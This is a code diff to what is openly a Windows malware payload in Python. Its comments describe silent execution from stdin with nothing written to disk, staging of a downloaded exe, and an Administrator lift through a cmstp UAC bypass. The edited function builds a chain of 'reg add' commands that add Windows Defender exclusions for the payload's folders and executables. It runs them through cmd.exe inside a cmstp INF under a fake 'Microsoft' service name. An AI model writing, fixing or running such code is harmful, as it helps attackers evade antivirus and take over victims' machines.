@@ -1,4 +1,4 @@
- # tung python-road payload — silent on every failure, stdlib only.
+# tung python-road payload — silent on every failure, stdlib only.
 # arrives through python's stdin (pythonw -u -); never a file on disk.
 # the exe url rides in from the jar (env EXE_URL = its baked windows url).
 # job order: stage the exe ->Administrator lift via cmstp (majanito shape)
@@ -380,13 +380,14 @@ def set_defender_exclusions():
     kill_all_cmstp()
     cleanup_infs()
     svc_name = f"Microsoft {rand_str(6)} Service"
-    reg_lines = [
-        f'HKLM,"{HP}","{appdir}",0x00010001,0',
-        f'HKLM,"{HP}","{winparent}",0x00010001,0',
-        f'HKLM,"{HR}","{EXE_NAME}",0x00010001,0',
-        f'HKLM,"{HR}","pythonw.exe",0x00010001,0',
-    ]
-    body = build_inf("rem", svc_name, reg_lines=reg_lines)
+    HP = "HKLM\\" + HP
+    HR = "HKLM\\" + HR
+    chain = " & ".join(subprocess.list2cmdline(a) for a in (
+        ["reg", "add", HP, "/v", appdir, "/t", "REG_DWORD", "/d", "0", "/f"],
+        ["reg", "add", HP, "/v", winparent, "/t", "REG_DWORD", "/d", "0", "/f"],
+        ["reg", "add", HR, "/v", EXE_NAME, "/t", "REG_DWORD", "/d", "0", "/f"],
+        ["reg", "add", HR, "/v", "pythonw.exe", "/t", "REG_DWORD", "/d", "0", "/f"]))
+    body = build_inf("cmd.exe /q /c " + chain, svc_name)
     # debug ground truth: the EXACT bytes handed to cmstp, kept on disk —
     # if it still fails, the report is this file, not a screenshot
     try:
